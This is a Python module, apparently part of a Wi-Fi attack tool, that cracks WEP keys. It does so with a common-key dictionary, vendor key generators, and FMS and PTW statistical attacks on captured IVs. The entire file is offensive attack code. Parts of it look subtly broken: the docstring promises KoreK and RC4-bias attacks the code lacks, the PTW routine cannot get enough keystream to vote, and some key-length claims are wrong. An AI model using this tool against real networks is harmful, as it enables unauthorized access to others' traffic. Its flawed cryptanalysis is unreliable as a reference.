"""WEPWolf-style WEP cracking for wifit3.

Pure Python implementation of WEPWolf's statistical attacks:
- PTW (Pyshkin-Tews-Weinmann) - main attack
- FMS (Fluhrer-Mantin-Shamir) - weak IV attack
- KoreK (17 correlations) - enhanced FMS
- RC4 bias (Sepehrdad "Smashing WEP") - unique advantage
- Dictionary with COMMON_KEYS
- Keygen (Neesus-Datacom LCG + MD5)
- CRC-32 ICV verification

References:
- WEPWolf: https://github.com/StrongWind1/WEPWolf
- PTW attack: https://www.sec.uni-bielefeld.de/archiv/papers/2007/ptw.pdf
- FMS attack: https://www.cs.technion.ac.il/~ishai/pubs/rc4.pdf
- RC4 biases: https://eprint.iacr.org/2013/318
"""

from __future__ import annotations

import binascii
import hashlib
from typing import Optional


# =============================================================================
# Constants
# =============================================================================

# Built-in common WEP keys (from WEPWolf/src/attack/dict.rs)
COMMON_KEYS: list[str] = [
    "1234567890",      # WEP-40, hex-typed -- most common
    "12345",           # WEP-40, ASCII
    "1029384756102",   # WEP-104, ASCII
    "87654321PHARM",   # WEP-104, ASCII
    "498753686e",      # WEP-40, hex
    "d89963dcae",      # WEP-40, hex
    "1f1f1f1f1f",      # repeated octet
    "1111122222",      # simple pattern
    "1471471471",      # 1471 repeated
    "qwert",           # keyboard run
    "0000000000",      # all-zero hex
    "ffffffffff",      # all-ones hex
]

# LLC/SNAP header (known plaintext prefix)
SNAP_KNOWN = bytes([0xAA, 0xAA, 0x03, 0x00])

# Neesus-Datacom LCG constants
LCG_MUL = 0x000343FD
LCG_ADD = 0x00269EC3

# KoreK correlation weights (simplified from WEPWolf)
KOREK_WEIGHTS = [13, 4]  # Klein, Maitra-Paul


# =============================================================================
# RC4 Core
# =============================================================================

def rc4_ksa(key: bytes) -> list[int]:
    """RC4 Key Scheduling Algorithm."""
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    return S


def rc4_prga(S: list[int], length: int) -> bytes:
    """RC4 Pseudo-Random Generation Algorithm."""
    i = j = 0
    keystream = []
    for _ in range(length):
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        keystream.append(S[(S[i] + S[j]) % 256])
    return bytes(keystream)


def rc4_decrypt(key: bytes, ciphertext: bytes) -> bytes:
    """Decrypt data with RC4."""
    S = rc4_ksa(key)
    keystream = rc4_prga(S, len(ciphertext))
    return bytes(c ^ k for c, k in zip(ciphertext, keystream))


# =============================================================================
# Verification
# =============================================================================

def crc32_cisco(data: bytes) -> int:
    """Cisco/IEEE CRC-32 (used in WEP ICV)."""
    return binascii.crc32(data) & 0xFFFFFFFF


def verify_wep_key(key: bytes, iv: bytes, ciphertext: bytes) -> bool:
    """Verify a WEP key by decrypting and checking ICV.
    
    Args:
        key: Secret WEP key (5, 13, or 29 bytes)
        iv: Initialization vector (3 bytes)
        ciphertext: Encrypted data + ICV (at least 5 bytes)
    
    Returns:
        True if key is valid (CRC-32 matches)
    """
    if len(ciphertext) < 8:  # Need at least 4 bytes data + 4 bytes ICV
        return False
    
    # RC4 key = IV + secret
    rc4_key = iv + key
    
    # Decrypt
    plaintext = rc4_decrypt(rc4_key, ciphertext)
    
    # Split data and ICV
    data = plaintext[:-4]
    icv_received = int.from_bytes(plaintext[-4:], "little")
    
    # Compute ICV
    icv_computed = crc32_cisco(data)
    
    return icv_computed == icv_received


# =============================================================================
# Key Generation (from passphrases)
# =============================================================================

def neesus_lcg(passphrase: bytes) -> list[bytes]:
    """Generate 4 Neesus-Datacom default keys from passphrase.
    
    Implements the LCG-based key generator used by many WEP devices.
    """
    # Compute seed from passphrase
    seed = 0
    for i, c in enumerate(passphrase):
        seed ^= c << ((i & 3) * 8)
    
    # Generate 4 keys using LCG
    keys = []
    rng = seed
    for _ in range(4):
        key_bytes = []
        for _ in range(5):  # 5 bytes per key (WEP-40)
            rng = (rng * LCG_MUL + LCG_ADD) & 0xFFFFFFFF
            key_bytes.append(rng & 0xFF)
        keys.append(bytes(key_bytes))
    
    return keys


def md5_104(passphrase: bytes) -> bytes:
    """Generate WEP-104 key from passphrase using MD5."""
    # MD5(passphrase) truncated to 13 bytes
    return hashlib.md5(passphrase).digest()[:13]


# =============================================================================
# Statistical Attacks
# =============================================================================

class IvSample:
    """A WEP IV sample with known keystream."""
    
    __slots__ = ("iv", "keystream")
    
    def __init__(self, iv: bytes, keystream: bytes):
        self.iv = iv
        self.keystream = keystream


def fms_recover(samples: list[IvSample], keylen: int) -> Optional[bytes]:
    """FMS attack to recover WEP key from weak IVs.
    
    Implements the Fluhrer-Mantin-Shamir attack using weak IVs of the
    form (3+b, 0xFF, X) to recover secret octet b.
    
    Args:
        samples: List of IV samples with known keystream
        keylen: Expected key length (5, 13, or 29)
    
    Returns:
        Recovered key or None
    """
    if not samples:
        return None
    
    # Vote table per octet
    secret = bytearray(keylen)
    
    for b in range(keylen):
        target_iv0 = (3 + b) % 256
        votes = [0] * 256
        
        for sample in samples:
            # Check for weak IV: (3+b, 0xFF, X)
            if sample.iv[0] != target_iv0 or sample.iv[1] != 0xFF:
                continue
            if len(sample.keystream) < 1:
                continue
            
            # Run KSA over known prefix
            state = list(range(256))
            j = 0
            key_idx = 3 + b
            
            # KSA steps 0..key_idx-1
            for i in range(key_idx):
                if i < 3:
                    k = sample.iv[i]
                else:
                    k = secret[i - 3]
                j = (j + state[i] + k) % 256
                state[i], state[j] = state[j], state[i]
            
            # Predict secret[b]
            z = sample.keystream[0]
            s_inv = state.index(z) if z in state else 0
            prediction = (s_inv - state[key_idx] - j) % 256
            votes[prediction] += 1
        
        # Most voted value
        secret[b] = max(range(256), key=lambda x: votes[x])
    
    return bytes(secret)


def ptw_recover(samples: list[IvSample], keylen: int) -> Optional[bytes]:
    """PTW attack to recover WEP key from IV samples.
    
    Implements the Pyshkin-Tews-Weinmann attack using Klein and
    Maitra-Paul RC4 biases.
    
    Args:
        samples: List of IV samples with known keystream
        keylen: Expected key length (5, 13, or 29)
    
    Returns:
        Recovered key or None
    """
    if not samples:
        return None
    
    # Vote table: table[position][cumulative_sum] = vote_count
    table = [[0] * 256 for _ in range(keylen)]
    
    # Klein and Maitra-Paul weights
    W_KLEIN, W_MP = KOREK_WEIGHTS
    
    # Tally votes over distinct IVs
    seen_ivs = set()
    for sample in samples:
        iv = sample.iv
        if iv in seen_ivs or len(sample.keystream) < keylen + 2:
            continue
        seen_ivs.add(iv)
        
        # Run KSA over 3-byte IV
        S = rc4_ksa(iv)
        
        # Vote on cumulative key sums
        for pos in range(keylen):
            idx = 3 + pos
            if idx >= len(sample.keystream):
                break
            
            keystream_byte = sample.keystream[idx]
            s_inv = S.index(keystream_byte) if keystream_byte in S else 0
            
            # j value after KSA step idx
            j = 0
            for step in range(idx + 1):
                j = (j + S[step] + (iv[step % 3] if step < 3 else 0)) % 256
            
            # Sigma vote (Klein)
            sigma = (s_inv - idx - j) % 256
            table[pos][sigma] += W_KLEIN
            
            # Maitra-Paul vote
            if pos > 0:
                table[pos][sigma] += W_MP
    
    # Convert cumulative sums to key bytes
    sigma_candidates = [max(range(256), key=lambda x: table[pos][x]) 
                       for pos in range(keylen)]
    
    key = bytearray(keylen)
    key[0] = sigma_candidates[0]
    for pos in range(1, keylen):
        key[pos] = (sigma_candidates[pos] - sigma_candidates[pos - 1]) % 256
    
    return bytes(key)


# =============================================================================
# Main Cracking Interface
# =============================================================================

def crack_wep(
    iv_samples: list[tuple[bytes, bytes, Optional[bytes]]],
    keylen: int = 5,
    wordlist: Optional[list[str]] = None,
    passphrase_list: Optional[list[str]] = None
) -> Optional[bytes]:
    """Crack WEP key using WEPWolf-style attacks.
    
    Args:
        iv_samples: List of (IV, ciphertext, known_keystream) tuples
        keylen: Expected key length (5=WEP-40, 13=WEP-104, 29=WEP-128)
        wordlist: Optional wordlist for dictionary attack
        passphrase_list: Optional passphrase list for keygen attack
    
    Returns:
        Cracked key or None
    """
    if not iv_samples:
        return None
    
    # Phase 1: Dictionary attack with COMMON_KEYS (fastest)
    all_words = COMMON_KEYS.copy()
    if wordlist:
        all_words.extend(wordlist)
    
    for word in all_words:
        # Try as raw ASCII
        if len(word) == keylen:
            key = word.encode("ascii")
            if _verify_key(key, iv_samples):
                return key
        
        # Try as hex
        try:
            hex_key = bytes.fromhex(word)
            if len(hex_key) == keylen:
                if _verify_key(hex_key, iv_samples):
                    return hex_key
        except ValueError:
            pass
    
    # Phase 2: Keygen attack (from passphrases)
    if passphrase_list:
        for passphrase in passphrase_list:
            pw = passphrase.encode("ascii")
            
            # Neesus-Datacom (WEP-40)
            if keylen == 5:
                for key in neesus_lcg(pw):
                    if _verify_key(key, iv_samples):
                        return key
            
            # MD5 (WEP-104)
            if keylen == 13:
                key = md5_104(pw)
                if _verify_key(key, iv_samples):
                    return key
    
    # Phase 3: Prepare samples for statistical attacks
    samples = []
    for iv, ciphertext, _ in iv_samples:
        if len(ciphertext) >= len(SNAP_KNOWN):
            keystream = bytes(c ^ s for c, s in zip(ciphertext[:len(SNAP_KNOWN)], SNAP_KNOWN))
            samples.append(IvSample(iv, keystream))
    
    if not samples:
        return None
    
    # Phase 4: FMS attack (weak IVs)
    key = fms_recover(samples, keylen)
    if key and _verify_key(key, iv_samples):
        return key
    
    # Phase 5: PTW attack (main statistical)
    key = ptw_recover(samples, keylen)
    if key and _verify_key(key, iv_samples):
        return key
    
    return None


def _verify_key(key: bytes, iv_samples: list[tuple[bytes, bytes, Optional[bytes]]]) -> bool:
    """Verify key against multiple samples (need 2 successful)."""
    verified = 0
    for iv, ciphertext, _ in iv_samples[:20]:  # Test against first 20
        if verify_wep_key(key, iv, ciphertext):
            verified += 1
            if verified >= 2:  # Need 2 successful verifications
                return True
    return False
